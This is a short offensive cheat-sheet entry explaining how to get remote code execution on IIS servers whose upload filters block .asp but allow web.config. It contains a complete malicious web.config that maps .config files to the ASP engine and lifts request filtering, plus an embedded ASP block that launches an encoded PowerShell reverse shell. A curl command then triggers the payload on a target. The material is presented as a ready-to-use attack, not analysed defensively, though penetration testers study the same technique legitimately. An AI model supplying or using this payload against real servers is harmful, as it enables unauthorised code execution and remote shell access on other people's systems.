# IIS web.config ASP RCE

When file upload filters block `.asp`/`.aspx` but allow `web.config`, upload a malicious `web.config` — IIS executes it as ASP.

**Malicious web.config:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*"
              modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll"
              resourceType="Unspecified" requireAccess="Write"
              preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set obj = CreateObject("WScript.Shell")
obj.Run "cmd /c powershell -enc <BASE64_ENCODED_REVSHELL>"
%>
```

**Trigger RCE:**
```bash
curl http://<TARGET>/uploads/web.config
```

**If upload dir is known:**
- Upload to any writable IIS directory
- Navigate to the file to execute it
